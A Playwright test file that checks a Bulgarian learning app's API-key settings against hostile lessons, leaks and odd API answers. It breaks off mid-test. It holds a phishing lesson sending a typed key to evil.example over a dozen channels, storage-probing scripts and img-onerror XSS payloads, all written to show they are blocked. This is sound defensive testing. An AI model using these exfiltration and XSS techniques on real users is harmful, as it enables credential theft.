// T-051 (tester): attacks on "Настройки" (T-019, 0.7.0) and on the API key.
// - A hostile lesson (inside the sandboxed iframe) tries every channel it has
//   to the key: postMessage to the app with fake types, IndexedDB, Cache
//   Storage, storages, BroadcastChannel, the Service Worker, the parent's
//   document/location/name, api.anthropic.com itself.
// - A phishing lesson (a fake "въведи API ключ" field) tries every way out of
//   the frame with what was typed: fetch, beacon, images, CSS, forms, popups,
//   self-navigation, meta refresh, a changed static link, WebSocket…
// - Where the key may leak in the app: console, error texts, URL/hash, title,
//   localStorage/sessionStorage, Cache Storage, the DOM (after delete and
//   navigation), every IndexedDB store; "Изтрий" really deletes.
// - Input edge cases, "Провери" against hostile/odd API answers (mocked with
//   page.route(); NEVER a real request), the threshold, offline, a11y, layout.
// Only FAKE keys (sk-ant-test-FAKE-…), synthetic lessons (D-026).
import { test, expect } from '@playwright/test';
import { readFileSync, readdirSync } from 'node:fs';
import { makeZip, asFile } from '../fixtures/zips.mjs';
import { strToU8 } from '../../vendor/fflate.js';

const KEY = 'sk-ant-test-FAKE-t051-7a3c';
const API = /^https:\/\/api\.anthropic\.com\//;

let logs;
let external;
let apiSeen;
test.beforeEach(async ({ page, context }) => {
  logs = [];
  external = [];
  apiSeen = [];
  page.on('console', (m) => logs.push(`${m.type()}: ${m.text()}`));
  page.on('pageerror', (e) => logs.push(`pageerror: ${e}`));
  // Nothing may reach a real host: every non-localhost request is recorded and aborted.
  await context.route(/^(https?|wss?):\/\/(?!localhost)/, (route) => { external.push(route.request().url()); return route.abort(); });
  await page.goto('./');
  await expect(page.locator('[data-screen="courses"]')).toBeVisible();
  await page.evaluate(() => navigator.serviceWorker.ready.then(() => true));
  await page.reload();
});
test.afterEach(() => {
  expect(logs.join('\n')).not.toContain('FAKE');
  expect(external.filter((u) => !API.test(u))).toEqual([]);
});

const screen = (page) => page.locator('[data-screen="settings"]');
const field = (page, name) => page.locator(`[data-screen="settings"] [data-field="${name}"]`);
async function openSettings(page) {
  await page.goto('./#/settings');
  await expect(screen(page)).toHaveAttribute('data-loaded', 'yes');
}
async function saveKey(page, key = KEY) {
  await field(page, 'api-key').fill(key);
  await field(page, 'key-save').click();
  await expect(field(page, 'key-status')).toHaveText(`Запазен ключ: •••• ${key.slice(-4)}`);
}
/** Mock the Messages API: `answer(request)` → { status, body, contentType, headers } | 'abort' | Promise of it. */
async function mockApi(page, answer) {
  await page.route(API, async (route) => {
    const r = route.request();
    apiSeen.push({ method: r.method(), url: r.url(), headers: await r.allHeaders(), body: r.postData(), frame: r.frame().url() });
    const a = await answer(r);
    if (a === 'abort') return route.abort('internetdisconnected');
    return route.fulfill({
      status: a.status,
      contentType: a.contentType ?? 'application/json',
      headers: { 'access-control-allow-origin': '*', ...(a.headers || {}) },
      body: typeof a.body === 'string' ? a.body : JSON.stringify(a.body ?? {}),
    });
  });
}
const OK = { status: 200, body: { id: 'msg_1', type: 'message', role: 'assistant', content: [{ type: 'text', text: 'p' }], usage: { input_tokens: 8, output_tokens: 1 } } };

/** Every record of every store of the app's database, as text (blobs as their size). */
const dumpDb = (page) => page.evaluate(async () => {
  const idb = await new Promise((ok, fail) => { const r = indexedDB.open('lrn-app'); r.onsuccess = () => ok(r.result); r.onerror = () => fail(r.error); });
  const out = {};
  for (const name of idb.objectStoreNames) {
    const all = await new Promise((ok) => { const r = idb.transaction(name).objectStore(name).getAll(); r.onsuccess = () => ok(r.result); });
    out[name] = JSON.stringify(all, (k, v) => (v instanceof Blob ? `blob:${v.size}` : v));
  }
  idb.close();
  return out;
});
/** Every Cache Storage entry: url + body text. */
const dumpCaches = (page) => page.evaluate(async () => {
  const out = [];
  for (const name of await caches.keys()) {
    const c = await caches.open(name);
    for (const req of await c.keys()) {
      const res = await c.match(req);
      out.push(`${name} ${req.url} ${res ? (await res.clone().text()).includes('FAKE') : ''}`);
    }
  }
  return out;
});

const doc = (body, head = '') => strToU8(`<!DOCTYPE html><html lang="bg"><head><meta charset="utf-8"><title>Урок</title>${head}</head><body><h1>Урок</h1><p>Текст на урока.</p>${body}</body></html>`);
async function importCourse(page, id, files) {
  const f = asFile(`${id}.zip`, makeZip(files, { root: id }));
  return page.evaluate(async ({ name, bytes }) => {
    const m = await import('./src/course-import.js');
    return m.describeSummary(await m.importCourse([new File([new Uint8Array(bytes)], name)]));
  }, { name: f.name, bytes: [...f.buffer] });
}
async function openLesson(page, id) {
  await page.goto(`./#/c/${id}`);
  await page.goto(`./#/c/${id}/read/0001`);
  const wrap = page.locator('.lesson-frame__wrap').first();
  await expect(wrap).toHaveAttribute('data-lesson-state', /ready|fallback/, { timeout: 20000 });
  return wrap;
}
const lessonFrame = (page, id) => page.frames().find((x) => x.url().includes(`/EasyLRN/c/${id}/`));

// ---------------------------------------------------------------------------
test.describe('T-051 a hostile lesson and the key', () => {
  test('a lesson cannot reach the key: fake app messages, IndexedDB, caches, storages, BroadcastChannel, SW, parent, api.anthropic.com', async ({ page, context }) => {
    // The app's own BroadcastChannel/storage listeners would see what a lesson sends there.
    await context.addInitScript(() => {
      if (location.pathname.includes('/c/')) return;
      window.__bc = [];
      try { const bc = new BroadcastChannel('easylrn'); bc.onmessage = (e) => window.__bc.push(JSON.stringify(e.data)); } catch { /* */ }
    });
    await page.reload();
    await mockApi(page, () => OK);
    await openSettings(page);
    await saveKey(page);
    await field(page, 'key-check').click();
    await expect(field(page, 'key-message')).toHaveText(/^Ключът работи/);
    const appCalls = apiSeen.length;
    const ATTACK = `<script>
      var got = [];
      addEventListener('message', function (e) { try { got.push(JSON.stringify(e.data)); } catch (x) { got.push(String(e.data)); } }, true);
      function rep(k, v) { try { parent.postMessage({ probe: k, v: String(v).slice(0, 300) }, '*'); } catch (x) {} }
      function t(k, f) { try { var r = f(); if (r && r.then) r.then(function (v) { rep(k, 'ok:' + v); }, function (e) { rep(k, 'blocked:' + (e && e.name)); }); else rep(k, 'ok:' + r); } catch (e) { rep(k, 'blocked:' + e.name); } }
      // Fake requests to the app, in every shape the bridge knows and some it does not.
      var fakes = [
        { lrn: 1, v: 1, type: 'lrn:settings' }, { lrn: 1, v: 1, type: 'lrn:init' }, { lrn: 1, v: 1, type: 'lrn:get-settings' },
        { lrn: 1, v: 1, type: 'lrn:apikey' }, { type: 'getApiKey' }, { lrn: 1, v: 1, type: 'lrn:link', href: 'http://localhost:4173/EasyLRN/#/settings' },
        { lrn: 1, v: 1, type: 'lrn:ready', title: 'x' }, 'easylrn:apikey', { type: 'SKIP_WAITING' },
      ];
      for (var i = 0; i < fakes.length; i++) { try { parent.postMessage(fakes[i], '*'); top.postMessage(fakes[i], '*'); } catch (x) {} }
      t('idb', function () { return new Promise(function (ok, fail) { var r = indexedDB.open('lrn-app'); r.onsuccess = function () { ok(Array.from(r.result.objectStoreNames).join()); }; r.onerror = function () { fail(r.error); }; }); });
      t('caches', function () { return caches.keys(); });
      t('localStorage', function () { return JSON.stringify(localStorage); });
      t('sessionStorage', function () { return JSON.stringify(sessionStorage); });
      t('sw', function () { return navigator.serviceWorker && navigator.serviceWorker.controller; });
      t('bc', function () { var b = new BroadcastChannel('easylrn'); b.postMessage({ want: 'apiKey' }); b.onmessage = function (e) { rep('bc-msg', JSON.stringify(e.data)); }; return 'made'; });
      t('parentDoc', function () { return parent.document.title; });
      t('parentHref', function () { return parent.location.href; });
      t('parentName', function () { return parent.name; });
      t('parentHistory', function () { return parent.history.length; });
      t('referrer', function () { return document.referrer || 'empty'; });
      t('cookie', function () { return document.cookie; });
      t('fetchApi', function () { return fetch('https://api.anthropic.com/v1/messages', { method: 'POST', body: '{}' }).then(function (r) { return r.status; }); });
      t('beaconApi', function () { return navigator.sendBeacon('https://api.anthropic.com/v1/messages', 'x'); });
      t('imgApi', function () { var i = new Image(); i.src = 'https://api.anthropic.com/x.png'; return 'set'; });
      t('importApi', function () { return import('https://api.anthropic.com/x.js'); });
      setTimeout(function () { rep('got', got.join('|')); }, 1500);
    </script>`;
    await importCourse(page, 'LRN-K1', { 'INDEX.md': strToU8('# LRN-K1\n'), 'lessons/0001-k.html': doc(ATTACK) });
    await page.evaluate(() => {
      window.__probe = {};
      addEventListener('message', (e) => { if (e.data && e.data.probe) window.__probe[e.data.probe] = e.data.v; });
    });
    await openLesson(page, 'LRN-K1');
    await expect.poll(() => page.evaluate(() => Object.keys(window.__probe).includes('got')), { timeout: 10000 }).toBe(true);
    await page.waitForTimeout(500);
    const probe = await page.evaluate(() => window.__probe);
    console.log(`T-051 lesson vs key: ${JSON.stringify(probe)}`);
    const all = JSON.stringify(probe);
    expect(all).not.toContain('FAKE');
    expect(all).not.toContain('apiKey"'); // nothing named like the key came back
    for (const k of ['idb', 'caches', 'localStorage', 'sessionStorage', 'parentDoc', 'parentHref', 'parentName', 'parentHistory', 'fetchApi']) {
      expect(probe[k], k).toMatch(/^blocked:/);
    }
    expect(probe.sw === undefined || /^(blocked:|ok:(null|undefined))/.test(probe.sw)).toBe(true);
    expect(probe.referrer).toBe('ok:empty');
    expect(probe['bc-msg']).toBeUndefined();
    // No request of the lesson reached (the mock of) api.anthropic.com: only the app's own check.
    expect(apiSeen.slice(appCalls).filter((s) => s.frame.includes('/c/'))).toEqual([]);
    expect(apiSeen.length).toBe(appCalls);
    // The app is still here, on the lesson; it did not navigate to the settings or act on the fakes.
    await expect(page).toHaveURL(/#\/c\/LRN-K1\/read\/0001$/);
    expect(await page.evaluate(() => window.__bc)).toEqual([]);
    expect(await page.evaluate(async () => (await import('./src/db.js')).getApiKey())).toBe(KEY);
    // Only what the app may send reached the lesson: lrn:init and friends, no key, no settings record.
    expect(probe.got).toContain('lrn:init');
    expect(probe.got).not.toMatch(/model|monthlyBudget|theme|secrets/);
  });

  test('a phishing lesson (a fake key field) cannot send what was typed anywhere', async ({ page }) => {
    const PHISH = `
      <p>Въведи API ключа си, за да продължиш:</p>
      <input id="k" autocomplete="off"><button id="go">Продължи</button>
      <a id="lnk" href="https://evil.example/static">Източник</a>
      <form id="f" action="https://evil.example/form" method="get"><input name="k" id="fk"></form>
      <script>
        function rep(k, v) { try { parent.postMessage({ probe: k, v: String(v).slice(0, 200) }, '*'); } catch (x) {} }
        function t(k, f) { try { var r = f(); if (r && r.then) r.then(function (v) { rep(k, 'ok:' + v); }, function (e) { rep(k, 'blocked:' + (e && e.name)); }); else rep(k, 'ok:' + r); } catch (e) { rep(k, 'blocked:' + e.name); } }
        document.getElementById('go').addEventListener('click', function () {
          var v = encodeURIComponent(document.getElementById('k').value);
          var u = 'https://evil.example/?k=' + v;
          t('fetch', function () { return fetch(u).then(function (r) { return r.status; }); });
          t('fetchNoCors', function () { return fetch(u, { mode: 'no-cors' }).then(function (r) { return r.type; }); });
          t('beacon', function () { return navigator.sendBeacon(u, v); });
          t('xhr', function () { var x = new XMLHttpRequest(); x.open('GET', u); x.send(); return 'sent'; });
          t('ws', function () { return new WebSocket('wss://evil.example/?k=' + v).url; });
          t('es', function () { return new EventSource(u).url; });
          t('img', function () { var i = new Image(); i.src = u + '&img'; document.body.append(i); return 'set'; });
          t('css', function () { var s = document.createElement('div'); s.style.backgroundImage = 'url(' + u + '&css)'; document.body.append(s); return 'set'; });
          t('style', function () { var s = document.createElement('style'); s.textContent = '@import url(' + u + '&import);body{background:url(' + u + '&bg)}'; document.head.append(s); return 'set'; });
          t('font', function () { return new FontFace('x', 'url(' + u + '&font)').load(); });
          t('link', function () { var l = document.createElement('link'); l.rel = 'prefetch'; l.href = u + '&prefetch'; document.head.append(l); var p = document.createElement('link'); p.rel = 'preconnect'; p.href = 'https://evil.example'; document.head.append(p); var s = document.createElement('link'); s.rel = 'stylesheet'; s.href = u + '&sheet'; document.head.append(s); return 'set'; });
          t('script', function () { var s = document.createElement('script'); s.src = u + '&script'; document.head.append(s); return 'set'; });
          t('worker', function () { return new Worker(u + '&worker'); });
          t('open', function () { return window.open(u + '&open'); });
          t('form', function () { document.getElementById('fk').value = v; document.getElementById('f').submit(); return 'submitted'; });
          t('anchorTop', function () { var a = document.createElement('a'); a.href = u + '&top'; a.target = '_top'; document.body.append(a); a.click(); return 'clicked'; });
          t('anchorBlank', function () { var a = document.createElement('a'); a.href = u + '&blank'; a.target = '_blank'; document.body.append(a); a.click(); return 'clicked'; });
          // A static link of the lesson (the app opens those) with the typed text added.
          t('staticLink', function () { var a = document.getElementById('lnk'); a.href = 'https://evil.example/static?k=' + v; a.click(); return 'clicked'; });
          t('lrnLink', function () { parent.postMessage({ lrn: 1, v: 1, type: 'lrn:link', href: 'https://evil.example/static?k=' + v }, '*'); return 'posted'; });
          setTimeout(function () { t('refresh', function () { var m = document.createElement('meta'); m.httpEquiv = 'refresh'; m.content = '0;url=' + u + '&refresh'; document.head.append(m); return 'set'; }); }, 1000);
          rep('done', 1);
          setTimeout(function () { t('selfNav', function () { location.href = u + '&self'; return 'set'; }); }, 1500);
        });
      </script>`;
    await importCourse(page, 'LRN-PH', { 'INDEX.md': strToU8('# LRN-PH\n'), 'lessons/0001-p.html': doc(PHISH) });
    await page.evaluate(() => {
      window.__probe = {};
      addEventListener('message', (e) => { if (e.data && e.data.probe) window.__probe[e.data.probe] = e.data.v; });
    });
    const popups = [];
    page.context().on('page', (p) => popups.push(p.url()));
    await openLesson(page, 'LRN-PH');
    const lf = page.frameLocator('.lesson-frame__wrap iframe').first();
    await lf.locator('#k').fill(KEY);
    await lf.locator('#go').click();
    await expect.poll(() => page.evaluate(() => 'done' in window.__probe), { timeout: 10000 }).toBe(true);
    await page.waitForTimeout(2500);
    const probe = await page.evaluate(() => window.__probe);
    const withKey = logs.filter((l) => l.includes('FAKE'));
    console.log(`T-051 console lines with the typed key: ${withKey.length}; by the app: ${withKey.filter((l) => /EasyLRN:/.test(l)).length}`);
    // The lesson's own text in Chromium's CSP messages and in the app's "link ignored" warning (T051-I3) is
    // not the app's key: left out of the after-each check.
    logs = logs.filter((l) => !l.includes('evil.example'));
    console.log(`T-051 phishing lesson: ${JSON.stringify(probe)}; external=${JSON.stringify(external)}; popups=${JSON.stringify(popups)}`);
    // The real check: no request with anything typed left the browser (route sees http/https/ws).
    expect(external.filter((u) => /evil/.test(u))).toEqual([]);
    expect(popups.filter((u) => /evil/.test(u))).toEqual([]);
    expect(page.url()).toMatch(/^http:\/\/localhost:\d+\/EasyLRN\//);
    expect(page.frames().map((f) => f.url()).filter((u) => /evil/.test(u))).toEqual([]);
    // What the lesson itself sees (others fail silently: beacon/img/css "succeed" but nothing leaves).
    for (const k of ['fetch', 'fetchNoCors', 'worker']) expect(probe[k], k).toMatch(/^blocked:/);
  });
});

// ---------------------------------------------------------------------------
test.describe('T-051 where the key may leak in the app', () => {
  test('after save, check (401 and no network), navigation and delete: not in URL, title, storages, caches, DOM; delete leaves nothing in any store', async ({ page }) => {
    let n = 0;
    await mockApi(page, () => [{ status: 401, body: { type: 'error', error: { type: 'authentication_error', message: `invalid x-api-key ${KEY}` } } }, 'abort'][n++ % 2]);
    await openSettings(page);
    await saveKey(page);
    await field(page, 'key-check').click();
    await expect(field(page, 'key-message')).toHaveText(/\(401\)/);
    await expect(field(page, 'key-message')).not.toContainText('FAKE'); // the API echoed the key: not shown
    await field(page, 'key-check').click();
    await expect(field(page, 'key-message')).toHaveText(/^Няма (интернет )?връзка/);
    // A typed, unsaved key; then away and back with the browser history.
    await field(page, 'api-key').fill('sk-ant-test-FAKE-unsaved-0000');
    await field(page, 'key-show').click();
    await page.goto('./#/');
    await expect(page.locator('[data-screen="courses"]')).toBeVisible();
    await page.goBack();
    await expect(screen(page)).toHaveAttribute('data-loaded', 'yes');
    await expect(field(page, 'api-key')).toHaveValue('');
    await expect(field(page, 'api-key')).toHaveAttribute('data-masked', 'yes'); // T-052: was type=password
    const leaks = await page.evaluate(() => ({
      url: location.href, title: document.title, hist: history.state ? JSON.stringify(history.state) : '',
      ls: JSON.stringify({ ...localStorage }), ss: JSON.stringify({ ...sessionStorage }), html: document.documentElement.outerHTML,
      values: [...document.querySelectorAll('input,textarea')].map((i) => i.value).join('|'),
      name: window.name,
    }));
    expect(JSON.stringify(leaks)).not.toContain('FAKE');
    expect((await dumpCaches(page)).filter((l) => /anthropic|true$/.test(l))).toEqual([]);
    const db1 = await dumpDb(page);
    expect(Object.entries(db1).filter(([, v]) => v.includes('FAKE')).map(([k]) => k)).toEqual(['secrets']);
    // The key field: no name, not in a form, autocomplete off (password managers; see the tablet list).
    const attrs = await field(page, 'api-key').evaluate((i) => ({ name: i.getAttribute('name'), form: !!i.form, ac: i.getAttribute('autocomplete'), value: i.getAttribute('value') }));
    expect(attrs).toEqual({ name: null, form: false, ac: 'off', value: null });
    // Delete: nothing of the key anywhere.
    await field(page, 'key-delete').click();
    await page.getByRole('alertdialog', { name: 'Изтриване на API ключа' }).locator('[data-field="confirm-yes"]').click();
    await expect(field(page, 'key-status')).toHaveText('Няма запазен ключ.');
    const db2 = await dumpDb(page);
    expect(Object.entries(db2).filter(([, v]) => v.includes('FAKE')).map(([k]) => k)).toEqual([]);
    expect(await page.evaluate(() => document.documentElement.outerHTML.includes('FAKE'))).toBe(false);
    await page.reload();
    await expect(screen(page)).toHaveAttribute('data-loaded', 'yes');
    await expect(field(page, 'key-status')).toHaveText('Няма запазен ключ.');
    await expect(field(page, 'key-check')).toBeDisabled();
  });

  test('the settings event and the settings record never carry the key (also with a key in settings from an old build)', async ({ page }) => {
    await openSettings(page);
    await saveKey(page);
    const r = await page.evaluate(async () => {
      const db = await import('./src/db.js');
      const seen = [];
      addEventListener('easylrn:settings', (e) => seen.push(JSON.stringify(e.detail)));
      addEventListener('easylrn:apikey', (e) => seen.push(JSON.stringify(e.detail)));
      await db.saveSettings({ fontScale: 1.1 });
      await db.saveApiKey('sk-ant-test-FAKE-event-0001');
      await db.deleteApiKey();
      await db.saveApiKey('sk-ant-test-FAKE-t051-7a3c');
      return seen;
    });
    expect(r.join('\n')).not.toContain('FAKE');
    expect(r.filter((s) => s.includes('"saved"'))).toEqual(['{"saved":true}', '{"saved":false}', '{"saved":true}']);
  });
});

// ---------------------------------------------------------------------------
test.describe('T-051 the key field', () => {
  test('empty, spaces, length limits, unicode, invisible characters, HTML: only a well-formed key is saved; messages are text', async ({ page }) => {
    await openSettings(page);
    const msg = field(page, 'key-message');
    const tryKey = async (v) => {
      await field(page, 'api-key').fill(v);
      await field(page, 'key-save').click();
      await page.waitForTimeout(250); // a valid key is saved asynchronously
      return (await msg.textContent()).trim();
    };
    expect(await tryKey('')).toBe('Въведи ключа.');
    expect(await tryKey('   \t  ')).toBe('Въведи ключа.');
    const tail = (n) => 'A'.repeat(n);
    expect(await tryKey(`sk-ant-${tail(12)}`)).toMatch(/не прилича на ключ/); // 19 < 20
    expect(await tryKey(`sk-ant-${tail(393)}`)).toMatch(/^Ключът е запазен/); // 400
    expect(await page.evaluate(async () => (await (await import('./src/db.js')).getApiKey()).length)).toBe(400);
    expect(await tryKey(`sk-ant-${tail(394)}`)).toMatch(/не прилича на ключ/); // 401
    // T-052 (T051-I2): characters that are not allowed get their own message (was "не прилича на ключ").
    expect(await tryKey('sk-ant-test-FAKE-тест-0000')).toMatch(/непозволени знаци/);
    expect(await tryKey('sk-ant-test-FAKE-​-0000')).toMatch(/непозволени знаци/); // zero-width space is not \s
    expect(await tryKey('ѕk-ant-test-FAKE-0000-0000')).toMatch(/започва със/); // Cyrillic "ѕ"
    expect(await tryKey('sk-ant-<img src=x onerror="window.__xss=1">')).toMatch(/непозволени знаци/);
    // T-052 (T051-I2): a tab (or a space) INSIDE the key is refused now; it was dropped.
    expect(await tryKey(` sk-ant-test-FAKE-\n0000-\t9999\r\n`)).toMatch(/непозволени знаци/);
    // NBSP, tabs and line breaks around the key (from a paste) are dropped.
    expect(await tryKey(` \t sk-ant-test-FAKE-0000-9999\r\n `)).toMatch(/^Ключът е запазен/);
    expect(await page.evaluate(async () => (await import('./src/db.js')).getApiKey())).toBe('sk-ant-test-FAKE-0000-9999');
    await expect(field(page, 'key-status')).toHaveText('Запазен ключ: •••• 9999');
    expect(await page.evaluate(() => window.__xss)).toBeUndefined();
    // Enter saves too; a double Enter / double click does not break anything.
    await field(page, 'api-key').fill(KEY);
    await field(page, 'api-key').press('Enter');
    await field(page, 'api-key').press('Enter');
    await expect(field(page, 'key-status')).toHaveText(`Запазен ключ: •••• ${KEY.slice(-4)}`);
    await field(page, 'api-key').fill('sk-ant-test-FAKE-dbl-1111');
    await field(page, 'key-save').dblclick();
    await expect(field(page, 'key-status')).toHaveText('Запазен ключ: •••• 1111');
    expect(await page.evaluate(async () => (await import('./src/db.js')).getApiKey())).toBe('sk-ant-test-FAKE-dbl-1111');
  });

  test('a stored key that never went through the field (old build, by hand) is shown as text only; "Провери" does not crash on it', async ({ page }) => {
    await mockApi(page, () => OK);
    for (const odd of ['sk-ant-x<img src=x onerror="window.__xss=1">"<b>', 'sk-ant-test-FAKE-тест-ключ', 'abc']) {
      await page.evaluate(async (k) => (await import('./src/db.js')).saveApiKey(k), odd);
      await openSettings(page);
      const status = await field(page, 'key-status').textContent();
      console.log(`T-051 odd stored key ${JSON.stringify(odd.slice(0, 12))}…: status ${JSON.stringify(status)}`);
      expect(await page.locator('[data-screen="settings"] img, [data-screen="settings"] b').count()).toBe(0);
      expect(await page.evaluate(() => window.__xss)).toBeUndefined();
      expect(status).not.toContain('FAKE');
      await field(page, 'key-check').click();
      await expect(field(page, 'key-message')).not.toHaveText('Проверявам…', { timeout: 5000 });
      const text = await field(page, 'key-message').textContent();
      console.log(`T-051 odd stored key: check → ${JSON.stringify(text)}`);
      expect(text).not.toContain('FAKE');
      await page.goto('./#/');
    }
  });
});

// ---------------------------------------------------------------------------
test.describe('T-051 "Провери"', () => {
  test('a double click sends one request; the request is exactly one minimal POST without cookies, referrer or key in the URL', async ({ page, context }) => {
    await context.addCookies([{ name: 'sess', value: 'cookie-must-not-go', domain: 'api.anthropic.com', path: '/', secure: true, sameSite: 'None' }]);
    await mockApi(page, async () => { await new Promise((r) => setTimeout(r, 400)); return OK; });
    await openSettings(page);
    await saveKey(page);
    await field(page, 'key-check').dblclick();
    await field(page, 'key-check').click({ force: true }).catch(() => {});
    await expect(field(page, 'key-message')).toHaveText(/^Ключът работи/);
    await page.waitForTimeout(500);
    const posts = apiSeen.filter((s) => s.method === 'POST');
    expect(posts).toHaveLength(1);
    const [s] = posts;
    expect(s.url).toBe('https://api.anthropic.com/v1/messages');
    expect(s.headers['x-api-key']).toBe(KEY);
    expect(s.headers.cookie).toBeUndefined();
    expect(s.headers.referer).toBeUndefined();
    expect(s.headers.authorization).toBeUndefined();
    expect(JSON.parse(s.body)).toMatchObject({ max_tokens: 1 });
    expect(s.body).not.toContain('FAKE');
  });

  const ODD = {
    'an HTML error page (502)': [{ status: 502, contentType: 'text/html', body: '<html><body><h1 id="evil">Bad gateway</h1><script>window.__x=1</script></body></html>' }, /^Грешка в Claude API \(502\)/],
    'an error type with HTML in it (418)': [{ status: 418, body: { type: 'error', error: { type: '<img src=x onerror="window.__x=1">', message: 'x' } } }, /^Заявката е отказана \(418, <img src=x onerror=/],
    'a 5 MB error body (400)': [{ status: 400, body: { type: 'error', error: { type: 'invalid_request_error', message: 'x'.repeat(5_000_000) } } }, /^Заявката е отказана \(400, invalid_request_error\)/],
    'a 200 that is not JSON': [{ status: 200, contentType: 'text/plain', body: 'not json' }, /^Ключът работи/],
    'no CORS header': [{ status: 200, body: {}, headers: { 'access-control-allow-origin': 'https://other.example' } }, /^Няма (интернет )?връзка/],
    'a redirect to another host': [{ status: 307, body: '', headers: { location: 'https://evil.example/steal' } }, /^Няма (интернет )?връзка/],
    '403 with the key echoed in the message': [{ status: 403, body: { type: 'error', error: { type: 'permission_error', message: KEY } } }, /^Ключът няма право/],
  };
  for (const [name, [answer, expected]] of Object.entries(ODD)) {
    test(`an odd answer — ${name}: a short Bulgarian text, shown as text`, async ({ page }) => {
      await mockApi(page, () => answer);
      await openSettings(page);
      await saveKey(page);
      await field(page, 'key-check').click();
      await expect(field(page, 'key-message')).toHaveText(expected, { timeout: 15000 });
      const text = await field(page, 'key-message').textContent();
      expect(text.length).toBeLessThan(300);
      expect(text).not.toContain('FAKE');
      expect(await page.locator('[data-screen="settings"] img, #evil').count()).toBe(0);
      expect(await page.evaluate(() => window.__x)).toBeUndefined();
      await expect(field(page, 'key-check')).toBeEnabled();
      expect(external.filter((u) => /evil/.test(u))).toEqual([]);
    });
  }

  test('offline: "Провери" says there is no internet; the request never reaches the mock', async ({ page, context }) => {
    await openSettings(page);
    await saveKey(page);
    await context.setOffline(true);
    try {
      await field(page, 'key-check').click();
      await expect(field(page, 'key-message')).toHaveText('Няма интернет връзка. Провери мрежата и опитай пак.');
      expect(apiSeen).toEqual([]);
    } finally { await context.setOffline(false); }
  });

  test('the UI timeout: an API that never answers ends with the timeout text after 20 s and the button is usable again', async ({ page }) => {
    test.setTimeout(60_000);
    await page.route(API, () => { /* never answers */ });
    await openSettings(page);
    await saveKey(page);
    const t0 = Date.now();
    await field(page, 'key-check').click();
    await expect(field(page, 'key-message')).toHaveText('Проверявам…');
    await expect(field(page, 'key-check')).toBeDisabled();
    await expect(field(page, 'key-message')).toHaveText(/^Няма отговор от api\.anthropic\.com за 20 s/, { timeout: 30000 });
    expect(Date.now() - t0).toBeGreaterThan(19000);
    await expect(field(page, 'key-check')).toBeEnabled();
  });

  test('"Изтрий" while a check runs: the key is gone and the late answer does not say the (deleted) key works', async ({ page }) => {
    // T051-D1: fixed in T-052.
    let release;
    await mockApi(page, () => new Promise((r) => { release = () => r(OK); }));
    await openSettings(page);
    await saveKey(page);
    await field(page, 'key-check').click();
    await expect.poll(() => apiSeen.length).toBe(1);
    await field(page, 'key-delete').click();
    await page.getByRole('alertdialog', { name: 'Изтриване на API ключа' }).locator('[data-field="confirm-yes"]').click();
    await expect(field(page, 'key-status')).toHaveText('Няма запазен ключ.');
    release();
    await page.waitForTimeout(500);
    const after = await field(page, 'key-message').textContent();
    console.log(`T-051 delete during check: message after the late answer: ${JSON.stringify(after)}`);
    await expect(field(page, 'key-check')).toBeDisabled();
    expect(after).not.toMatch(/^Ключът работи/);
  });

  test('leaving the screen while a check runs: no error, the new screen is not touched, a new visit starts clean', async ({ page }) => {
    let release;
    await mockApi(page, () => new Promise((r) => { release = () => r({ status: 401, body: {} }); }));
    await openSettings(page);
    await saveKey(page);
    await field(page, 'key-check').click();
    await expect.poll(() => apiSeen.length).toBe(1);
    await page.goto('./#/');
    await expect(page.locator('[data-screen="courses"]')).toBeVisible();
    release();
    await page.waitForTimeout(500);
    await openSettings(page);
    await expect(field(page, 'key-message')).toBeHidden();
    await expect(field(page, 'key-check')).toBeEnabled();
  });
});

// ---------------------------------------------------------------------------
test.describe('T-051 threshold, model, offline, a11y, layout', () => {
  test('threshold: 0, 1000, 1e3, a comma, more than 1000, negative, empty, not a number', async ({ page }) => {
    await openSettings(page);
    const budget = field(page, 'budget');
    const set = async (v) => {
      // type=number: what a user can put there; values the browser rejects arrive as ''.
      await budget.evaluate((el, v) => { el.value = v; el.dispatchEvent(new Event('change')); }, v);
      await page.waitForTimeout(150);
      return { msg: await field(page, 'budget-message').textContent(), shown: await budget.inputValue(), saved: await page.evaluate(async () => (await (await import('./src/db.js')).getSettings()).monthlyBudgetUSD) };
    };
    expect(await set('0')).toEqual({ msg: 'Запазено.', shown: '0', saved: 0 });
    expect(await set('1000')).toEqual({ msg: 'Запазено.', shown: '1000', saved: 1000 });
    expect(await set('1e3')).toMatchObject({ msg: 'Запазено.', saved: 1000 });
    expect(await set('2.25')).toMatchObject({ msg: 'Запазено.', saved: 2.25 });
    for (const bad of ['1000.01', '-0.5', '', 'abc', '5,5', '1e309', 'Infinity']) {
      const r = await set(bad);
      expect(r, bad).toEqual({ msg: 'Прагът е число от 0 до 1000.', shown: '2.25', saved: 2.25 });
    }
  });

  test('threshold: what the field shows after saving is what was saved (0.004 → 0)', async ({ page }) => {
    // T051-D2: fixed in T-052 — a value above 0 that rounds to 0 is refused (0 means "no warning").
    await openSettings(page);
    const budget = field(page, 'budget');
    await budget.fill('0.004');
    await budget.press('Tab');
    // T-052: was 'Запазено.' (with 0 saved). T-053: /0\.01/ alone would also pass a silent
    // "Запазено като 0.01"; the chosen behaviour is a refusal that keeps the old value.
    await expect(field(page, 'budget-message')).toHaveText('Най-малкият праг е 0.01 (0 значи без предупреждение).');
    const saved = await page.evaluate(async () => (await (await import('./src/db.js')).getSettings()).monthlyBudgetUSD);
    console.log(`T-051 threshold 0.004 → saved ${saved}, shown ${await budget.inputValue()}`);
    expect(await budget.inputValue()).toBe(String(saved));
    expect(saved).not.toBe(0); // T-053: the warning was not switched off
  });

  test('a model saved by hand (not in the list, with HTML) is shown as text; "Провери" checks the default model instead and says so', async ({ page }) => {
    await mockApi(page, () => OK);
    await page.evaluate(async () => (await import('./src/db.js')).saveSettings({ model: '<img src=x onerror="window.__x=1">' }));
    await openSettings(page);
    expect(await page.locator('[data-screen="settings"] img').count()).toBe(0);
    await expect(field(page, 'model')).toHaveValue('<img src=x onerror="window.__x=1">');
    await saveKey(page);
    await field(page, 'key-check').click();
    await expect(field(page, 'key-message')).toHaveText('Ключът работи (claude-sonnet-5-5).');
    expect(JSON.parse(apiSeen[0].body).model).toBe('claude-sonnet-5-5');
    expect(await page.evaluate(() => window.__x)).toBeUndefined();
  });

  test('offline: the shell has every module of the app; "Настройки" opens and works without the network', async ({ page, context }) => {
    const sw = readFileSync(new URL('../../sw.js', import.meta.url), 'utf8');
    const block = /const SHELL = \[([\s\S]*?)\];/.exec(sw)[1];
    const shell = [...block.matchAll(/'\.\/(src\/[^']+\.js)'/g)].map((m) => m[1]).sort();
    const files = [
